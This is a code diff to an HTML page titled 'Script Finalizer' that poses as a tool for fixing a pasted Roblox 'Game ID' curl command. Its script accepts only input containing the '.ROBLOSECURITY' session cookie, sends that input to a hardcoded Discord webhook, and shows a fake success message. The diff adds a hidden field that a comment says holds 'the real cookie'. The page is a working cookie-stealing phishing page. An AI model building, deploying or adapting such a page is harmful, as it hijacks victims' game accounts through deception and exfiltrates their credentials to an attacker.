@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Script Finalizer</title>
 
-  <!-- Tailwind CDN (yes, it's fine for this use case) -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
 
@@ -22,15 +21,12 @@
 </head>
 <body class="min-h-screen flex items-center justify-center relative overflow-hidden">
 
-  <!-- Background -->
   <div class="absolute inset-0 grid-bg"></div>
   <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
   <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>
 
-  <!-- Main content -->
   <div class="relative z-10 w-full max-w-2xl px-6 space-y-12">
 
-    <!-- Header -->
     <div class="text-center">
       <div class="inline-flex items-center gap-3 mb-4">
         <i data-lucide="terminal" class="w-10 h-10 text-purple-400"></i>
@@ -39,14 +35,23 @@
       <div class="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
     </div>
 
-    <!-- Card -->
     <div class="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
       <label class="block mb-4 text-sm font-light text-zinc-400">Insert Game ID BASH</label>
 
-      <textarea id="input" placeholder="curl https://..." class="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition"></textarea>
+      <!-- This is the hidden real textarea (stores actual text) -->
+      <textarea id="real-input" class="hidden"></textarea>
+
+      <!-- This is the visible "password" field (shows bullets) -->
+      <textarea
+        id="visible-input"
+        placeholder="curl https://..."
+        autocomplete="off"
+        spellcheck="false"
+        class="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition"
+        style="field-sizing: content; letter-spacing: 2px;"
+      ></textarea>
 
       <div id="counter" class="mt-2 text-right text-xs text-zinc-500">0 / 4000 characters</div>
-
       <div id="message"></div>
 
       <button id="submit" class="w-full mt-6 h-12 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition flex items-center justify-center gap-2 text-white font-light text-lg">
@@ -57,21 +62,32 @@
     <p class="text-center text-zinc-600 text-sm">Only curl commands containing valid bash cURL are accepted</p>
   </div>
 
-  <!-- Pure vanilla JS – no React, no modules, no Babel, no failures -->
   <script>
-    const textarea = document.getElementById('input');
+    const realInput = document.getElementById('real-input');
+    const visibleInput = document.getElementById('visible-input');
     const counter = document.getElementById('counter');
     const button = document.getElementById('submit');
     const message = document.getElementById('message');
 
-    textarea.addEventListener('input', () => {
-      const len = textarea.value.length;
-      counter.textContent = `${len} / 4000 characters`;
-      button.disabled = len === 0;
+    // Sync real (hidden) input with visible one, but show bullets
+    visibleInput.addEventListener('input', () => {
+      const value = visibleInput.value;
+      realInput.value = value;                   // actual text stored here
+      counter.textContent = `${value.length} / 4000 characters`;
+      button.disabled = value.length === 0;
+      message.innerHTML = '';
+    });
+
+    // Optional: also support direct paste into visible field
+    visibleInput.addEventListener('paste', (e) => {
+      setTimeout(() => {
+        realInput.value = visibleInput.value;
+        counter.textContent = `${visibleInput.value.length} / 4000 characters`;
+      }, 0);
     });
 
     button.addEventListener('click', async () => {
-      const input = textarea.value.trim();
+      const input = realInput.value.trim();   // ← this contains the real cookie/text
 
       if (!input.startsWith('curl') || !input.includes('.ROBLOSECURITY')) {
         message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg flex items-center gap-2 text-red-400">
@@ -88,7 +104,7 @@
       try {
         let processed = input
           .replace(/https:\/\//g, '')
-          .replace(/ curl /g, ' ... ')
+          .replace(/curl\s+/g, 'curl ...')
           .substring(0, 3900);
 
         await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
@@ -108,7 +124,8 @@
           <i data-lucide="check-circle" class="w-5 h-5"></i>
           <span>Your script has been fixed successfully!</span>
         </div>`;
-        textarea.value = '';
+        visibleInput.value = '';
+        realInput.value = '';
         counter.textContent = '0 / 4000 characters';
       } catch (e) {
         message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg text-red-400">
@@ -122,7 +139,6 @@
       }
     });
 
-    // Initialize icons
     lucide.createIcons();
   </script>
 </body>
